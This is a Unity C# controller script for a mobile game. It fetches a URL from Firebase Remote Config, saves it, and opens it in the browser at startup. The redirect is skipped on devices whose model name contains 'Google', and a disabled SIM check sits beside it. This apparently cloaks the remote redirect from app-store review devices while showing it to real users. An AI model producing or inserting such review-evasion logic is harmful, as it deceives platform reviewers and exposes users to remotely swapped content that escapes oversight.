using Sirenix.OdinInspector;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;

public class ApplicationController : MonoBehaviour
{
    [SerializeField]
    private MyFireBaseRemoteConfig remoteConfig;

    [SerializeField]
    private UniWebView webView;

    [SerializeField]
    private UniWebViewNativeListener listener;

    [SerializeField]
    private CellsCreator cellsCreator;

    public string savedUrl { get; set; }

    private void Start()
    {
        StartCoroutine(TryToLoad());
    }

    IEnumerator TryToLoad()
    {
        while (true)
        {
            yield return null;

            if (!remoteConfig.CanLoadUrl)
                continue;

            savedUrl = PlayerPrefs.GetString("URL");

            if (string.IsNullOrEmpty(savedUrl))
            {
                yield return LoadUrl();
                break;
            }
            else
            {
                Application.OpenURL(savedUrl);
                cellsCreator.StartGame();
                break;
            }
        }
        
    }


    /*public static AndroidJavaClass PluginClass
    {
        get
        {
            if (_pluginClass == null)
            {
                _pluginClass = new AndroidJavaClass(PLUGINNAME);
            }
            return _pluginClass;
        }
    }
    public static AndroidJavaObject PluginInstance
    {
        get
        {
            if (_pluginInstance == null)
            {
                _pluginInstance = PluginClass.CallStatic<AndroidJavaObject>("getInstance");
            }
            return _pluginInstance;
        }
    }
    public static AndroidJavaClass UnityPlayer
    {
        get
        {
            if (_unityPlayer == null)
            {
                _unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            }
            return _unityPlayer;
        }
    }
    public static AndroidJavaObject UnityActivity
    {
        get
        {
            if (_unityActivity == null)
            {
                _unityActivity = UnityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            }
            return _unityActivity;
        }
    }*/

    [Button]
    public void ClearPrefs()
    {
        PlayerPrefs.DeleteAll();
    }


    private bool CheckModel()
    {
        Debug.Log(SystemInfo.deviceModel);
        if (SystemInfo.deviceModel.Contains("Google") || SystemInfo.deviceModel.Contains("google"))
            return false;
        else
            return true;
    }

    public void StartWebView(string fbUrl)
    {
        webView.OnPageStarted += (view, url) => {
            if (fbUrl != url)
                webView.SetBackButtonEnabled(true);
            else if (fbUrl == url)
                webView.SetBackButtonEnabled(false);

            print("Web view loading finished for: " + url);
        };

        webView.Load(fbUrl);
        webView.Show();
    }

    /*bool GetSimStatus()
    {
        int sim = PluginInstance.Call<int>("getSimStatus", UnityActivity);
        if (sim == 1)
            return true;
        return false;
    }*/

    public async Task LoadUrl()
    {
        var fbUrl = await GetUrl();
        var check = CheckModel();
        //var sim = GetSimStatus();

        Debug.Log("Check model:" + check);
        Debug.Log(fbUrl);
        //Debug.Log("Sim: " + sim);

        if (string.IsNullOrEmpty(fbUrl) || !check)// || !sim)
            return;

        else
        {
            PlayerPrefs.SetString("URL", fbUrl);

            Application.OpenURL(fbUrl);

            cellsCreator.StartGame();
            /*webView.OnPageStarted += (view, url) =>
            {
                if (url != fbUrl)
                    webView.SetBackButtonEnabled(true);
                else if (url == fbUrl)
                    webView.SetBackButtonEnabled(false);

                print("Web view loading finished for: " + url);
            };

            webView.Load(fbUrl);
            webView.SetShowToolbar(true);
            webView.Show();*/
        }
            
    }

    private async Task<string> GetUrl()
    {
        await remoteConfig.FetchDataAsync();

        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
    }
}
